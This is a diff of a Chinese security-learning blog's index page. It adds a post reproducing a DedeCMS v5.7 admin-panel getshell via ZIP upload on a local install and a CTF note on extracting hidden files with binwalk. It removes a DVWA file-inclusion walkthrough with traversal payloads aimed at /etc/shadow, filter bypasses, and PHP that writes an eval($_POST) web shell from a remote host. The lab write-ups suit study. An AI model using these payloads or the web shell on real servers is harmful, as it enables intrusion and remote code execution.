@@ -134,52 +134,63 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-BugKuCTF—利用Kali分离图片中的隐藏文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-渗透学习 — Dedecms v5.7漏洞复现合集" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">BugKuCTF — 利用Kali分离图片中的隐藏文件</a>
+      <a class="article-title" href="/Knlvre.github-io/2019/02/28/渗透学习 — Dedecms v5.7漏洞复现合集/">渗透学习 — Dedecms v5.7漏洞复现合集</a>
     </h1>
   
 
         
-        <a href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/" class="archive-article-date">
-  	<time datetime="2019-02-25T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-26</time>
+        <a href="/Knlvre.github-io/2019/02/28/渗透学习 — Dedecms v5.7漏洞复现合集/" class="archive-article-date">
+  	<time datetime="2019-02-27T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-28</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>在刚开始做CTF的杂项习题时，碰到有些图片会藏着文件</p>
-<p>而这时就需要把图片给提取出来，看到很多题解用到了KALI里面的工具：<strong>Binwalk、dd、foremost</strong>，于是便去了解</p>
-<h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p>可以借用BUGKU中的这道题，题目地址：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/37b57dc545752a92fa6b2d571b88667a/1cdf3a75-21ed-4b91-8d49-1b348d44dcf.zip</span><br></pre></td></tr></table></figure>
-<h3 id="一、Binwalk"><a href="#一、Binwalk" class="headerlink" title="一、Binwalk"></a>一、Binwalk</h3><p>Binwalk会分析一张指定的图片</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk ada.jpg</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-7.png" alt="6-7"></p>
-<p>像这张图片，发现隐藏着flag.txt</p>
-<p>Binwalk也可以做提取工作，加一个 -e 参数就可以了</p>
-<p>不过也会出差错，最好和foremost、dd结合起来提取更完整的内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e ada.jpg</span><br></pre></td></tr></table></figure>
-<h3 id="二、foremost"><a href="#二、foremost" class="headerlink" title="二、foremost"></a>二、foremost</h3><p>foremost工具是用来分离出图片中隐藏的文件，举上面的栗子</p>
-<p>我们用binwalk确定ada.jpg图片中有隐藏文件后，就可以进行分离</p>
-<p>它会在当前目录下生成一个<strong>output</strong>文件夹，分离出来的文件放在里面</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost ada.jpg</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-3.png" alt="6-3"></p>
-<h3 id="三、dd"><a href="#三、dd" class="headerlink" title="三、dd"></a>三、dd</h3><p>dd工具也是用来分离的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=ada.jpg of=ada.zip skip=218773 bs=1</span><br></pre></td></tr></table></figure>
-<p><strong>if</strong>：要提取分离的文件</p>
-<p><strong>of</strong>：输出的文件</p>
-<p><strong>skip</strong>：跳转到第218773块后再提取，这个参数可以看binwalk分析出来的数据而决定</p>
-<p><strong>bs</strong>：设置每次读写块的大小为1个字节</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-8.png" alt="6-8"></p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考大佬写的文章。而本文是想把自己的学习过程简单记录一下，下载链接：<a href="http://updatenew.dedecms.com/base-v57/package/DedeCMS-V5.7-UTF8-SP2.tar.gz" target="_blank" rel="noopener">Dedecms v5.7 sp2</a></p>
+<h1 id="ox01-前台任意用户密码修改"><a href="#ox01-前台任意用户密码修改" class="headerlink" title="[ox01]前台任意用户密码修改"></a>[ox01]前台任意用户密码修改</h1><h1 id="ox02-后台getshell"><a href="#ox02-后台getshell" class="headerlink" title="[ox02]后台getshell"></a>[ox02]后台getshell</h1><p>先创建一个文件<strong>1.jpg.php</strong>，其中内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>将这个文件压缩成<strong>ZIP</strong>格式的压缩文件</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/1-1.png" alt="1-1"></p>
+<p>网站环境初始化，进入到这个本地网站环境：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2</span><br></pre></td></tr></table></figure>
+<p>点击<strong>uploads</strong>，按照提示的步骤对网站初始化</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/2-1.png" alt="2-1"></p>
+<p>进入到后台：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/dede/</span><br></pre></td></tr></table></figure>
+<p>默认登录的用户名和密码都是<strong>admin</strong></p>
+<p>进入 <strong>附件管理 — 文件式管理器</strong> 的 <strong>soft</strong> 文件夹中</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/3-1.png" alt="3-1"></p>
+<p>点击 <strong>文件上传</strong> 把刚才创建的 <strong>1.zip</strong> 压缩文件上传上去</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/3-2.png" alt="3-2"></p>
+<p>发布刚才上传的文档</p>
+<p>访问这个地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/dede/album_add.php</span><br></pre></td></tr></table></figure>
+<p>看到的是 <strong>发布新图集</strong> 的界面</p>
+<p>先点击右上角的 <strong>栏目管理 — 增加顶级栏目</strong> 创建一个栏目，这样下一步操作才能继续</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-1.png" alt="4-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-2.png" alt="4-2"></p>
+<p>然后简单填写一下图中那2栏必填的就可以点击确定了</p>
+<p>注意：<strong>内容模型</strong> 这一栏要选择 <strong>图片集</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-3.png" alt="4-3"></p>
+<p>再次返回刚才 <strong>发布新图集</strong> 的界面，填写一下图中那几栏的信息</p>
+<p>勾选 <strong>从ZIP压缩包中提取文件</strong> 点击 <strong>浏览</strong> 选择刚才我们上传的 <strong>1.zip</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-4.png" alt="4-4"></p>
+<p>当提示 <strong>成功发布一个图集</strong> 时，点击 <strong>浏览文档</strong> </p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/5-1.png" alt="5-1"></p>
+<p>点击这个标签，就可以看到结果</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/5-2.png" alt="5-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/5-3.png" alt="5-3"></p>
 <hr>
-<p>这篇文章只做简单的介绍</p>
-<p>如果想要详细具体的命令，每个人需求都不同，根据具体需要，自己去搜索</p>
+<p>参考文章：</p>
+<p><a href="https://xz.aliyun.com/t/4150" target="_blank" rel="noopener">https://xz.aliyun.com/t/4150</a></p>
 
       
 
@@ -193,7 +204,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF-Misc</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
         		</li>
       		
 		</ul>
@@ -203,7 +214,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">展开全文 >></a>
+          <a class="article-more-a" href="/Knlvre.github-io/2019/02/28/渗透学习 — Dedecms v5.7漏洞复现合集/">展开全文 >></a>
         </p>
       
 
@@ -415,6 +426,105 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/Knlvre.github-io/2019/02/26/BugKuCTF—杂项题 第1-10关/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-BugKuCTF—利用Kali分离图片中的隐藏文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">BugKuCTF — 利用Kali分离图片中的隐藏文件</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/" class="archive-article-date">
+  	<time datetime="2019-02-25T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>在刚开始做CTF的杂项习题时，碰到有些图片会藏着文件</p>
+<p>而这时就需要把图片给提取出来，看到很多题解用到了KALI里面的工具：<strong>Binwalk、dd、foremost</strong>，于是便去了解</p>
+<h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p>可以借用BUGKU中的这道题，题目地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/37b57dc545752a92fa6b2d571b88667a/1cdf3a75-21ed-4b91-8d49-1b348d44dcf.zip</span><br></pre></td></tr></table></figure>
+<h3 id="一、Binwalk"><a href="#一、Binwalk" class="headerlink" title="一、Binwalk"></a>一、Binwalk</h3><p>Binwalk会分析一张指定的图片</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk ada.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-7.png" alt="6-7"></p>
+<p>像这张图片，发现隐藏着flag.txt</p>
+<p>Binwalk也可以做提取工作，加一个 -e 参数就可以了</p>
+<p>不过也会出差错，最好和foremost、dd结合起来提取更完整的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e ada.jpg</span><br></pre></td></tr></table></figure>
+<h3 id="二、foremost"><a href="#二、foremost" class="headerlink" title="二、foremost"></a>二、foremost</h3><p>foremost工具是用来分离出图片中隐藏的文件，举上面的栗子</p>
+<p>我们用binwalk确定ada.jpg图片中有隐藏文件后，就可以进行分离</p>
+<p>它会在当前目录下生成一个<strong>output</strong>文件夹，分离出来的文件放在里面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost ada.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-3.png" alt="6-3"></p>
+<h3 id="三、dd"><a href="#三、dd" class="headerlink" title="三、dd"></a>三、dd</h3><p>dd工具也是用来分离的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=ada.jpg of=ada.zip skip=218773 bs=1</span><br></pre></td></tr></table></figure>
+<p><strong>if</strong>：要提取分离的文件</p>
+<p><strong>of</strong>：输出的文件</p>
+<p><strong>skip</strong>：跳转到第218773块后再提取，这个参数可以看binwalk分析出来的数据而决定</p>
+<p><strong>bs</strong>：设置每次读写块的大小为1个字节</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-8.png" alt="6-8"></p>
+<hr>
+<p>这篇文章只做简单的介绍</p>
+<p>如果想要详细具体的命令，每个人需求都不同，根据具体需要，自己去搜索</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF-Misc</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">展开全文 >></a>
         </p>
       
 
@@ -1458,146 +1568,6 @@
 
 
   
-    <article id="post-DVWA 4-File Inclusion（文件包含）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/13/DVWA 4-File Inclusion（文件包含）/">DVWA 4-File Inclusion（文件包含）</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/02/13/DVWA 4-File Inclusion（文件包含）/" class="archive-article-date">
-  	<time datetime="2019-02-12T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-13</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DVWA\vulnerabilities\fi\source\</span><br></pre></td></tr></table></figure>
-<h2 id="页面功能"><a href="#页面功能" class="headerlink" title="页面功能"></a>页面功能</h2><p>直接点击<code>file1.php、file2.php、file3.php</code>可以相应跳转到不同的界面</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-3.png" alt="4-3"></p>
-<h2 id="开启allow-url-include"><a href="#开启allow-url-include" class="headerlink" title="开启allow_url_include"></a>开启allow_url_include</h2><p>进入之后如果<code>allow_url_include</code>没有开启，会出现如下画面</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-1.png" alt="4-1"></p>
-<p>此时只需要进入<code>phpinfo</code>，查看配置文件的路径，比如我的：<code>C:\phpstudy\php\php-5.4.45\php.ini</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-2.png" alt="4-2"></p>
-<p>修改该配置文件中的<code>allow_url_include = On</code>，然后重启服务就可以了</p>
-<h2 id="Security-Level-—-Low"><a href="#Security-Level-—-Low" class="headerlink" title="Security Level — Low"></a>Security Level — Low</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>从代码中可以看出来，对接受的<code>page</code>参数没有经过任何的处理，我们现在分别点击初始页面中的<code>file1.php、file2.php、file3.php</code>，发现<code>URL</code>中改变的只有page参数</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-4.png" alt="4-4"></p>
-<p>既然page没有任何限制，现在就能读取其他文件，操作开始</p>
-<p>1.本地文件包含</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=/etc/shadow</span><br></pre></td></tr></table></figure>
-<p>没有找到文件，那就说明这台服务器并不是Linux服务器</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-5.png" alt="4-5"></p>
-<p>在服务器根目录下写一个test.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>使用<code>绝对路径</code>访问test.php，访问成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=C:\phpstudy\www\test.php</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-6.png" alt="4-6"></p>
-<p>使用<code>相对路径</code>访问test.php，访问成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=../../../../../../phpstudy/www/test.php</span><br></pre></td></tr></table></figure>
-<p>Ps：多个<code>../</code>是为了能够保证到达当下盘的根目录；斜杠和反斜杠都可以</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-7.png" alt="4-7"></p>
-<p>2.远程文件包含</p>
-<p>当服务器的php配置中，选项<code>allow_url_fopen</code>与<code>allow_url_include</code>为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行</p>
-<p>直接试一下访问百度，直接访问成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=http://www.baidu.com</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-8.png" alt="4-8"></p>
-<p>在另外一台<code>远程主机</code>上写入一个txt文件，内容为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	$file = fopen(&apos;shell02.php&apos;,&apos;w&apos;);</span><br><span class="line">	$string = &apos;&lt;?php eval($_POST[pass]); ?&gt;&apos;;</span><br><span class="line">	fputs($file,$string);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-13.png" alt="4-13"></p>
-<p>现在就可以远程包含这个文件（我的远程主机IP为：192.168.43.84）</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-14.png" alt="4-14"></p>
-<p>再去查看，已经生成了shell文件</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-15.png" alt="4-15"></p>
-<p>菜刀成功连接</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-16.png" alt="4-16"></p>
-<p>后续难度只要能绕过黑白名单的限制，就可以同上面方法一样去远程包含、生成shell、菜刀连接，不再赘述</p>
-<h2 id="Security-Level-—-Medium"><a href="#Security-Level-—-Medium" class="headerlink" title="Security Level — Medium"></a>Security Level — Medium</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"http://"</span>, <span class="string">"https://"</span> ), <span class="string">""</span>, $file );</span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"../"</span>, <span class="string">"..\""</span> ), <span class="string">""</span>, $file );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>从代码中可以看出来，利用<code>str_replace()</code>函数对<code>http://、https://、../、..\</code>这4个重要的关键字符进行了过滤，但是绕过规则也比较简单，直接<code>双写</code>或者<code>大小写</code>就可以解决</p>
-<p>虽然<code>../</code>无法绕过，但影响也不大，因为绝对路径还可以使用，试一下双写绕过，可以成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=hthttp://tp://www.baidu.com</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-9.png" alt="4-9"></p>
-<p>试一下大小写绕过，也可以成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=HtTp://www.baidu.com</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-10.png" alt="4-10"></p>
-<h2 id="Security-Level-—-High"><a href="#Security-Level-—-High" class="headerlink" title="Security Level — High"></a>Security Level — High</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">"file*"</span>, $file ) &amp;&amp; $file != <span class="string">"include.php"</span> ) &#123;</span><br><span class="line">	<span class="comment">// This isn't the page we want!</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>源码中可以看出来通过<code>fnmatch()</code>函数限制了输入的参数必须以<code>file</code>开头，但是我们还是可以绕过</p>
-<p>1.file协议</p>
-<p>因为使用浏览器打开一个本地文件时，使用的是file协议，刚好以file开头</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://C:/phpstudy/WWW/file.txt</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-11.png" alt="4-11"></p>
-<p>现在构造URL</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=file://C:/phpstudy/www/test.php</span><br></pre></td></tr></table></figure>
-<p>成功访问</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-12.png" alt="4-12"></p>
-<h2 id="Security-Level-—-Impossible"><a href="#Security-Level-—-Impossible" class="headerlink" title="Security Level — Impossible"></a>Security Level — Impossible</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( $file != <span class="string">"include.php"</span> &amp;&amp; $file != <span class="string">"file1.php"</span> &amp;&amp; $file != <span class="string">"file2.php"</span> &amp;&amp; $file != <span class="string">"file3.php"</span> ) &#123;</span><br><span class="line">	<span class="comment">// This isn't the page we want!</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>Impossible难度只允许<code>include.php</code>或者<code>file{1..3}.php</code>，虽然不灵活，但是却彻底杜绝文件包含漏洞</p>
-<hr>
-<p>参考文章：</p>
-<p><a href="https://www.freebuf.com/articles/web/119150.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/119150.html</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
